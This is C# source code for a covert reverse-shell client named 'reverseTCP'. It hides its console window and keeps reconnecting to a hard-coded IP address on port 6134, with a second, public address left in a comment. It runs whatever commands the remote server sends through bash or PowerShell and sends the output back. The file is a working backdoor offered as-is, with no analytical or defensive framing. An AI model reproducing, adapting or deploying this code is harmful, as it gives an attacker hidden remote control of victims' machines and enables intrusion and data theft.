using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace reverseTCP
{
    public class Program
    {
        public static void Main()
        {
            /* Make the Window Invisible */
            invisible.hide();

            /* Create a TcpClient */
            TcpClient clientSocket = new TcpClient();

            /* Try to Connect until it Succeeds */
            while (!clientSocket.Connected)
            {
                try
                {
                    /* Connect */
                    clientSocket.Connect("192.168.178.21"/*91.89.8.184*/, 6134);
                }
                catch {
                    /* Skip the Error */
                }
                /* Sleep before Connecting again */
                Thread.Sleep(3000);
            }

            /* Get an result from the Command 'whoami' and send it to the Server */
            string command = skt.send(system.shell("whoami"), clientSocket);

            /* Start the main Loop */
            while (true)
            {
                /* Clean the command */
                command = command.Replace("\0", "");

                /* "Switch" the Response-Command from the Server */

                if (command.ToLower().Trim() == "exit")
                {
                    /* Reset the client */
                    clientSocket.Client.Disconnect(true);
                    clientSocket.Close();
                    clientSocket = new TcpClient();

                    /* try to send something,
                     * which will fail,
                     * and which again will lead to a while loop,
                     * which is trying to connect to the server */

                    command = skt.send(system.shell("echo 'disconnected'"), clientSocket);
                }
                else if (command.ToLower().Trim().StartsWith("cd"))
                {
                    string response = string.Empty;
                    try {
                        /* Try Converting commandinput ('cd C:/.../...') to path ('C:/.../...') */
                        string newDir = (((command.Replace("\0", "")).ToLower().Trim()).Substring(2)).Trim();
                        /* Try setting path to the Directory */
                        Directory.SetCurrentDirectory(newDir);
                        /* execute echo(null) and get result (null) */
                        response = system.shell("echo ' '");
                    }
                    catch (Exception ex) {
                        /* Catch wrong format Error or Directory does not Exist */
                        /* Set Response to exception */
                        response = system.shell($"echo '{ex.Message}'");
                    }

                    /* Send the Response and get a new Server-Response */
                    command = skt.send(response, clientSocket);
                    
                }
                else
                {
                    /* Execute Command and get output */
                    string response = system.shell(command);
                    /* Send output and get new Command */
                    command = skt.send(response, clientSocket);
                }
            }
        }
    }

    public class skt
    {
        public static string send(string msg, TcpClient client)
        {
            try
            {
                string m = msg;
                if (msg.Length + 1 > 65536)
                {
                    m = "[-] Output is larger than 65536";
                    m += $"\n{Environment.UserName}@{Dns.GetHostName()}:" + (Directory.GetCurrentDirectory().Replace(":", "").ToLower().Trim()).Replace("\\", "/") + "$ ";
                }

                NetworkStream serverStream = client.GetStream();
                byte[] outStream = System.Text.Encoding.ASCII.GetBytes(m + "$");
                serverStream.Write(outStream, 0, outStream.Length);
                serverStream.Flush();
                StringBuilder myCompleteMessage = new StringBuilder();
                int numberOfBytesRead = 65536;
                string retu = string.Empty;
                do
                {
                    try
                    {
                        byte[] inStream = new byte[numberOfBytesRead];
                        numberOfBytesRead = serverStream.Read(inStream, 0, inStream.Length);
                        string returndata = Encoding.ASCII.GetString(inStream);
                        retu = returndata;
                        myCompleteMessage.AppendFormat("{0}", Encoding.ASCII.GetString(inStream, 0, numberOfBytesRead));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                while (serverStream.DataAvailable);
                return retu;
            }
            catch
            {
                while (!client.Connected)
                {
                    try
                    {
                        
                        client.Connect("192.168.178.21", 6134);
                    }
                    catch {
                        /*skip*/
                    }
                    Thread.Sleep(3000);
                }
                return "whoami";
            }
        }
    }

    public class system
    {
        public static string shell(string command)
        {
            try
            {
                ProcessStartInfo procStartInfo = new ProcessStartInfo(info.IsLinux ? "/bin/bash" : "powershell.exe", info.IsLinux ? "-c '" + command + "'" : "/c " + command);
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                String result = proc.StandardOutput.ReadToEnd();

                result += $"\n{Environment.UserName}@{Dns.GetHostName()}:"+(Directory.GetCurrentDirectory().Replace(":", "").ToLower().Trim()).Replace("\\", "/")+"$ ";

                return result;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
    }

    public class invisible {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void hide()
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);
        } 
    }

    public class info
    {
        public static bool IsLinux
        {
            get
            {
                int p = (int)Environment.OSVersion.Platform;
                return (p == 4) || (p == 6) || (p == 128);
            }
        }
    }
}